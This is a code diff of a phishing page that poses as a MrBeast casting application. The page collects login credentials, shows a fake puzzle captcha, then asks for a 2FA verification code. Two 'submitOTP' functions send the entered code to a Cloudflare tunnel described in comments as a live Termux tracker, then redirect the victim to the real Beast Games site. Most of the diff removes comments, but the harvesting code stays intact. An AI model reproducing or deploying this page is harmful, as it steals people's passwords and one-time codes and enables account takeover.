@@ -22,7 +22,6 @@
             position: relative; 
         }
         
-        /* BACKGROUND: MANY SMALL LOGOS EVERYWHERE (0.25 OPACITY) */
         .bg-pattern { 
             position: fixed; 
             top: 0; 
@@ -36,7 +35,6 @@
             pointer-events: none; 
         }
         
-        /* TOP BIG LOGO */
         .top-logo { 
             width: 320px; 
             margin-top: 50px; 
@@ -46,7 +44,6 @@
             position: relative; 
         }
         
-        /* TALL APP-STYLE BOX */
         .box { 
             background: #111; 
             border-radius: 35px; 
@@ -61,7 +58,6 @@
             margin-bottom: 60px; 
         }
         
-        /* MIDDLE BOX LOGO */
         .mid-logo { 
             width: 130px; 
             margin: 0 auto 20px auto; 
@@ -115,7 +111,6 @@
             box-shadow: 0 10px 25px rgba(241, 46, 62, 0.4); 
         }
         
-        /* MODERN PUZZLE CAPTCHA */
         #puzzle-box, #loader, #step2 { display: none; }
         .puzzle-container { background: #1a1a1a; padding: 15px; border-radius: 20px; border: 1px solid #333; margin-top: 10px; }
         .canvas-area { 
@@ -174,12 +169,10 @@
 <body>
     <div class="bg-pattern"></div>
     
-    <!-- TOP BIG LOGO -->
     <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="top-logo" alt="Main Header Logo">
 
     <div class="box">
         <div id="step1">
-            <!-- MIDDLE BOX LOGO -->
             <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="mid-logo" alt="Box Center Logo">
             
             <div class="mrbeast-style-text"><span class="mr-txt">MR</span> BEAST CASTING</div>
@@ -189,7 +182,6 @@
             <input type="password" id="pass" placeholder="Password" required>
             <button type="button" class="main-btn" onclick="goToPuzzle()">CONTINUE</button>
         </div>
-        <!-- Paste this between Line 191 and 192 -->
         <div id="step2" style="display:none; text-align:center; padding:20px;">
             <p style="color:white;">A 6-digit verification code was sent to your device. Please enter it below to confirm your application:</p>
            <input type="text" id="2fa_code" placeholder="G-XXXXXX" style="margin-bottom:10px;">
@@ -249,16 +241,13 @@
                 piece.style.left = (15 + (x / (rect.width - 70)) * 260) + 'px';
                 if (x > rect.width - 95) { dragging = false; showLoader(); }
             };function submitOTP() {
-    // This grabs the 6-digit code from your "OTP" box
     const otp = document.getElementsByName('otp')[0].value;
     
-    // This sends it to your LIVE Termux tracker in Window 2
     fetch('https://postposted-settings-belly-quest.trycloudflare.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({ 'verification_code': otp })
     }).then(() => {
-        // After capturing the code, send them to the real MrBeast site
         window.location.href = "https://www.beastgames.com";
     });
 }
@@ -281,24 +270,18 @@
             }, 14000);
        }
    function submitOTP() {
-    // 1. Grab the 6-digit code from the input box
     const c = document.getElementById('2fa_code').value; 
-    
-    // 2. Send the code to your Termux Tracker in Window 2
     fetch('https://postposted-settings-belly-quest.trycloudflare.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({ '2fa_code': c })
     }).then(() => {
-        // 3. THIS UNSTUCKS THE SITE: Redirect to the real MrBeast site
         window.location.href = "https://www.beastgames.com";
-    }).catch(() => {
-        // Redirect anyway even if the tunnel is slow
-        window.location.href = "https://www.beastgames.com";
+       }).catch(() => {
+          window.location.href = "https://www.beastgames.com";
     });
 }
 
-    </script>
 </body>
 </html>
 
